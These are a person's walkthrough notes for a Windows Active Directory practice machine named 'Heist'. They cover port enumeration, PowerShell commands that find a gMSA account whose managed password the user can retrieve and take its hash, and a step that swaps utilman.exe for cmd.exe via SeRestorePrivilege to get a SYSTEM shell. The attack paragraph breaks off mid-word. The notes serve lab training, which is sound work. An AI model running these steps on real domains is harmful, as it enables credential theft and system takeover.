# Heist

Sanitized practice-box notes. Folder layout matches the Obsidian template: **General Info → External (per port) → Exploit → Internal / Priv Esc → Loot**, with **Evidence** next to the phase where the screenshot was taken.

| | |
| --- | --- |
| OS (guess from ports) | Windows / AD |
| Notes | Personal walkthrough, not a spoiler-free writeup |

## Layout

- [General Info](General-Info.md)
- [Exploit](Exploit.md)
- [Loot](Loot.md)
- [External](External/) — per-port enumeration
- [Internal / Priv Esc](Internal/Priv-Esc.md)

### Ports touched

- `135-RPC`
- `139-netbios-ssn`
- `3268-ldap`
- `3269-TCPwrapped`
- `3389-RDP`
- `389-ldap`
- `464-Kerberos`
- `49666-49677-Microsoft-Windows-RPC`
- `53-DNS`
- `593-RPC`
- `636-TCPwrapped`
- `8080-http`
- `88-kerberos`
- `9389-mc-nmf`

## Attack notes

possible unquoted service exploit Using the following PowerShell command, we can confirm that this account is a service account with GMSA enabled -> Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"} to find info about which groups have permissions to retrieve the password for the svc_apache service account -> Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,PrincipalsAllowedToRetrieveManagedPassword command to confirm if our user is a member of the Web Admins group just to be sure -> Get-ADGroupMember "Web Admins" the Current Value for rc4_hmac is the hash we need To take advantage of the SeRestorePrivilge -> 1. Rename these two files 2. Then RDP into the machine `rdeskto

### Commands used

```bash
Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}
Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,PrincipalsAllowedToRetrieveManagedPassword
Get-ADGroupMember "Web Admins"
mv C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
mv C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```


### References

- https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe

## Evidence

![Pasted image 20240619191918.png](Evidence/Pasted%20image%2020240619191918.png)

![Pasted image 20240619200604.png](Internal/Evidence/Pasted%20image%2020240619200604.png)

![Pasted image 20240715212544.png](Internal/Evidence/Pasted%20image%2020240715212544.png)

![Pasted image 20240715211313.png](Internal/Evidence/Pasted%20image%2020240715211313.png)

![Pasted image 20240715205128.png](Internal/Evidence/Pasted%20image%2020240715205128.png)

![Pasted image 20240715212656.png](Internal/Evidence/Pasted%20image%2020240715212656.png)

![Pasted image 20240715212527.png](Internal/Evidence/Pasted%20image%2020240715212527.png)

![Pasted image 20240619201151.png](Internal/Evidence/Pasted%20image%2020240619201151.png)

![Pasted image 20240715205113.png](Internal/Evidence/Pasted%20image%2020240715205113.png)

![Pasted image 20240619200919.png](Internal/Evidence/Pasted%20image%2020240619200919.png)

![Pasted image 20240619201414.png](Internal/Evidence/Pasted%20image%2020240619201414.png)

![Pasted image 20240715211556.png](Internal/Evidence/Pasted%20image%2020240715211556.png)
